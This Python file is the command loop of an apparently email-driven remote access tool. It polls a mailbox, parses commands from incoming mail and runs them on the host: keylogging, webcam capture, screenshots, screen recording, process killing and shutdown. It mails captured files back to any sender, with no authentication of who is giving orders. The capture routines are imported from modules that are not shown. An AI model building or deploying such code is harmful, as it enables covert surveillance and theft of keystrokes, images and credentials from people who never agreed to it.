# import resource.mail_handle_receive as mail_handle_receive
from resource.mail_handle_receive import *
import resource.mail_handle_send as mail_handle_send
import resource.message_generate as message_generate
import resource.system_control as system_control
import resource.keylogr as keylogr
import resource.resource_monitor as resource_monitor
import resource.record as recorder
import datetime
import time
import re
import os

function_map = {
    'help': message_generate.help,
    'shutdown': system_control.shutdown,
    'kill_process': resource_monitor.kill_process,
    'screenshot': system_control.screenshot,
    'webcam': system_control.webcam_image,
    'keylog': keylogr.keylog,
    'list_apps': resource_monitor.getAppInfo,
    'list_processes': resource_monitor.list_processes,
    'screen_record': recorder.screen_record
}


def request_handle(msg_list):
    if msg_list == None:
        return
    for msg in msg_list:
        recipient_mail = re.search(r'[\w\.-]+@[\w\.-]+', msg['From']).group()
        cmd_list = decode_mail(msg)
# change cmd to message for each mail sent
    for cmd in cmd_list:
        try:
            if cmd == "help":
                message = message_generate.help()
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message)
            elif cmd == "list_processes" or cmd == "list_apps":
                data = function_map[cmd]()
                message = message_generate.DataFormat(data, cmd)
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message)
            elif cmd == "shutdown":
                message = message_generate.success_message(cmd)
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message)
                function_map[cmd]()
            elif cmd.startswith('keylog'):
                splitted = cmd.split(' ')
                filename = function_map[splitted[0]](int(splitted[1]))
                message = message_generate.success_message(cmd)
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message, filename)
            elif cmd == "screenshot" or cmd == "webcam":
                filename = function_map[cmd]()
                message = message_generate.success_message(cmd)
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message, filename)
            elif cmd.startswith('kill_process'):
                splitted = cmd.split(' ')
                function_map[splitted[0]](int(splitted[1]))
                message = message_generate.success_message(cmd)
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message)
            elif cmd.startswith('screen_record'):
                splitted = cmd.split(' ')
                filename = function_map[splitted[0]](splitted[1], 28, bool(int(splitted[2])))
                message = message_generate.success_message(cmd)
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message, filename)
            else:
                function_map[cmd]()
                message = message_generate.success_message(cmd)
                mail_handle_send.send_mail_success_execution(
                    recipient_mail, message)
        except Exception as e:
            print(e)
            message = message_generate.failure_message(cmd)
            mail_handle_send.send_mail_failure_execution(
                recipient_mail, message)


def waiting(message):
    print('', end='\r')
    icon = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█']
    n = len(icon)
    for i in range(n):
        print(f'{message} {icon[i]}', end='\r')
        time.sleep(0.2)
    for i in range(n):
        print(f'{message} {icon[n-1-i]}', end='\r')
        time.sleep(0.2)


def main():
    mail = login()
    while True:
        msg_list = get_mail_object(mail)
        if msg_list == None:
            waiting('Waiting for command')
        else:
            now = datetime.datetime.now()
            timestamp = '\n> > > >[ '+now.strftime("%H:%M:%S") + ' ]< < < <\n'
            print(timestamp)
            request_handle(msg_list)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExited")
        os.system("pause")
